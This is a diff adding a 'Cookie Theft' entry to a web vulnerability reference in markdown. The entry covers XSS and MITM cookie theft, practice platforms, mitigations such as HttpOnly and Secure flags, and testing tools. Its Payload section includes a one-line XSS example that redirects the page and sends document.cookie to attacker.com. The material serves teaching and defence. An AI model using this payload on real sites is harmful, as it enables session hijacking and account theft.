@@ -1692,3 +1692,110 @@ You can simulate this vulnerability using:
 - OWASP Top 10 - A2: Broken Authentication
 
 ***
+# 🌐 WebVuln-022: Cookie Theft
+
+**Category:**  
+Session Management
+
+**Vulnerability ID:**  
+`WEBVULN-022`
+
+---
+
+## 🧪 Demo / Proof of Concept (PoC)
+
+### 📌 Scenario:
+An attacker can steal session cookies or authentication tokens through various means, such as **XSS** or **MITM** attacks, or by exploiting insecure cookie handling mechanisms in the web application.
+
+---
+
+### 🧩 Payload
+
+#### **XSS (Cross-Site Scripting)**
+Injecting malicious JavaScript into the application to steal cookies.
+
+Example:
+```javascript
+document.location = 'http://attacker.com/cookie?'+document.cookie;
+```
+## 🌐 MITM Attack
+
+If no encryption (SSL/TLS) is used, an attacker on an insecure network can intercept HTTP traffic and capture cookies.
+
+---
+
+### ✅ Effect
+
+- **Session Hijacking:**  
+  Once an attacker steals a valid session cookie, they can impersonate the victim and gain unauthorized access to their account or session.
+
+- **Credential Theft:**  
+  Cookies containing sensitive data, such as authentication tokens, can be captured and used for further attacks, like credential stuffing.
+
+---
+
+## 🌐 PoC Platforms
+
+You can simulate this vulnerability using the following platforms:
+
+- **DVWA (Damn Vulnerable Web Application)**  
+- **bWAPP (Buggy Web Application)**  
+- **WebGoat (A security-focused web application)**
+
+---
+
+## 🛡️ Mitigation
+
+To mitigate the risk of cookie theft, consider the following best practices:
+
+- ✅ **Use Secure Cookies:**  
+  Ensure cookies are marked with the `HttpOnly`, `Secure`, and `SameSite` flags to reduce the risk of theft via XSS and ensure cookies are only sent over HTTPS.
+
+- ✅ **Implement SSL/TLS (HTTPS):**  
+  Always use HTTPS to encrypt communication between the client and server, which helps prevent MITM attacks and protects session cookies in transit.
+
+- ✅ **Use SameSite Cookies:**  
+  Set the `SameSite` attribute of cookies to `Strict` or `Lax` to mitigate CSRF (Cross-Site Request Forgery) and reduce the risk of cookie theft through cross-site attacks.
+
+- ✅ **Regular Session Regeneration:**  
+  Regenerate session IDs after login and periodically during a session to prevent session fixation and reduce the impact of stolen session cookies.
+
+- ✅ **Implement Token-Based Authentication:**  
+  Use token-based authentication mechanisms (e.g., JWT) for stateless sessions to prevent the reliance on session cookies.
+
+---
+
+## 🔧 Testing Tools / Techniques
+
+The following tools and techniques can be used to test for and exploit cookie theft vulnerabilities:
+
+- **Burp Suite:**  
+  Use Burp Suite to intercept and manipulate cookies, as well as to test for vulnerabilities in session management.
+
+- **OWASP ZAP:**  
+  A popular open-source tool for security testing, including scanning for XSS vulnerabilities and insecure cookie handling.
+
+- **Wireshark:**  
+  Use Wireshark to sniff unencrypted HTTP traffic and capture session cookies if no SSL/TLS encryption is used.
+
+- **Manual Testing:**  
+  Test for weak or missing cookie flags, XSS vulnerabilities, and other session management weaknesses manually.
+
+---
+
+## 📚 References
+
+- **OWASP: Session Management**  
+  Link: [OWASP Session Management](https://owasp.org/www-project-top-ten/)
+
+- **OWASP Top 10 - A2: Broken Authentication**  
+  Link: [OWASP Top 10](https://owasp.org/www-project-top-ten/)
+
+- **PortSwigger: Cookie Theft and XSS**  
+  Link: [PortSwigger Cookie Theft](https://portswigger.net/web-security/cross-site-scripting)
+
+- **OWASP Cheat Sheet: Secure Session Management**  
+  Link: [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
+
+
+***
